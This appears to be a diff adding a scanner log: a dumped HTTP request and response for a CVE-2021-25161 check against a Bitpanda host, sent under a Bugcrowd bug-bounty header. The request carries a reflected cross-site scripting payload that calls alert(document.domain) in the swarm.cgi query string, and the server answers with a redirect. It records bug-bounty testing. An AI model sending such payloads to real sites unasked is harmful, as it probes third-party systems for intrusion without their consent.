@@ -1,0 +1,24 @@
+[CVE-2021-25161] Dumped HTTP request for https://techsolutions.bitpanda.com/swarm.cgi?opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts="%27;%0Aalert(document.domain);//%0a%27
+
+
+GET /swarm.cgi?opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts="%27;%0Aalert(document.domain);//%0a%27 HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2021-25161] Dumped HTTP response https://techsolutions.bitpanda.com/swarm.cgi?opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts="%27;%0Aalert(document.domain);//%0a%27
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Location: ./swarm.cgi/?opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts="%27;%0Aalert(document.domain);//%0a%27
+Via: 1.1 5b0b018dc5d72a42f205b24b17f4f56e.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: TG6NgihGXzfzkhUaSdWJU63yykXjZZOi7wJXO3tsEhZyxhBX0AoHQg==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+Content-Length: 0
+
+
